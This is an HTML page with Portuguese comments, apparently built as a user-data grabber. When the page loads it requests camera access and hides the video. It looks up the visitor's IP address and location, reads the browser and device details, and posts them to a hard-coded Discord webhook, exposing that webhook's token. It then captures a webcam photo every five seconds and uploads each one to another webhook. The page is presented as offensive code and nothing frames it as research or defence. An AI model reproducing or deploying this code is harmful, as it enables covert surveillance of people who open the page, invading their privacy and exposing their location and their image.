<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Coletar Dados do Usuário</title>
    <style>
        body {
            background-color: black;  /* fundo preto */
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: white;
            font-family: 'Courier New', Courier, monospace;
        }
        video {
            display: none;  /* Ocultar o vídeo da câmera */
        }
        .content {
            text-align: center;
            padding: 20px;
            border: 2px solid white;
            border-radius: 10px;
            background-color: rgba(0, 0, 0, 0.7);
            width: 300px;
            box-shadow: 0 0 15px rgba(255, 255, 255, 0.2);
        }
        h1 {
            color: #ff6347; /* Cor vermelha para títulos */
        }
        p {
            font-size: 1.2em;
            margin: 10px 0;
        }
    </style>
</head>
<body>
    <div class="content">
        <h1>Coletando Informações...</h1>
        <p id="status">Aguardando dados...</p>
        <video id="videoElement" autoplay></video>  <!-- vídeo oculto -->
    </div>

    <script>
        // Função para pegar informações do dispositivo
        function getDeviceInfo() {
            const deviceInfo = navigator.userAgent;  // Informações do dispositivo
            const browser = getBrowser();  // Função para capturar o navegador corretamente
            return { deviceInfo, browser };
        }

        // Função para detectar o navegador corretamente
        function getBrowser() {
            let userAgent = navigator.userAgent.toLowerCase();
            if (userAgent.indexOf("chrome") > -1) {
                return "Chrome";
            } else if (userAgent.indexOf("firefox") > -1) {
                return "Firefox";
            } else if (userAgent.indexOf("safari") > -1) {
                return "Safari";
            } else {
                return "Desconhecido";
            }
        }

        // Função para enviar as informações para o Discord Webhook
        function sendToDiscord(info) {
            const webhookUrl = 'https://discord.com/api/webhooks/1280941270138617957/e7v-FHCaX2LGwZZuKXhHTyBSCEa4vcPPPIeTsQISfv8WEJ5s0utTnnnQ5flRLYAu2ks3';

            fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `
**# Informações do Usuário:**

> **IP:** ${info.ip}
> **Dispositivo:** ${info.deviceInfo}
> **Navegador:** ${info.browser}
> **Região:** ${info.region}

**Foto Capturada:**
`})
            })
            .then(response => {
                if (response.ok) {
                    console.log('Dados enviados com sucesso!');
                } else {
                    console.error('Erro ao enviar dados');
                }
            })
            .catch(error => console.error('Erro ao enviar dados:', error));
        }

        // Função para capturar a foto a cada 5 segundos e enviar ao Discord
        function capturePhoto(videoElement) {
            const canvas = document.createElement('canvas');
            canvas.width = 640;  // Defina o tamanho do canvas para capturar a imagem
            canvas.height = 480;
            const context = canvas.getContext('2d');
            context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(blob => {
                sendPhotoToDiscord(blob);  // Enviar foto para o Discord Webhook
            }, 'image/jpeg');
        }

        // Função para enviar a foto para o Discord Webhook
        function sendPhotoToDiscord(blob) {
            const formData = new FormData();
            formData.append('file', blob);

            fetch('https://discord.com/api/webhooks/YOUR_WEBHOOK_URL', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => console.log('Foto enviada para o webhook:', data))
            .catch(error => console.error('Erro ao enviar foto:', error));
        }

        // Função para acessar a câmera do usuário e começar o processo
        function startCamera() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(function (stream) {
                    const videoElement = document.getElementById('videoElement');
                    videoElement.srcObject = stream;

                    // Obter informações do dispositivo
                    const deviceInfo = getDeviceInfo();

                    // Atualizar a interface com os dados de status
                    document.getElementById('status').innerText = 'Obtendo informações do IP...';

                    // Pegar o IP público e a localização
                    fetch('https://ip-api.com/json')  // Pega o IP público e a localização
                        .then(response => response.json())
                        .then(data => {
                            // Incluindo IP e região no envio ao Discord
                            const userInfo = {
                                ip: data.query,  // IP do usuário
                                deviceInfo: deviceInfo.deviceInfo,  // Informações do dispositivo
                                browser: deviceInfo.browser,  // Navegador
                                region: data.city + ', ' + data.country  // Região (cidade, país)
                            };

                            sendToDiscord(userInfo);  // Enviar as informações ao Discord

                            // Captura foto a cada 5 segundos
                            setInterval(() => capturePhoto(videoElement), 5000);
                        })
                        .catch(error => {
                            console.error('Erro ao pegar informações do IP:', error);
                            document.getElementById('status').innerText = 'Erro ao obter informações do IP!';
                        });
                })
                .catch(function (error) {
                    console.error('Erro ao acessar a câmera:', error);
                    document.getElementById('status').innerText = 'Erro ao acessar a câmera!';
                });
        }

        // Iniciar câmera automaticamente ao carregar a página
        window.onload = startCamera;
    </script>
</body>
</html>
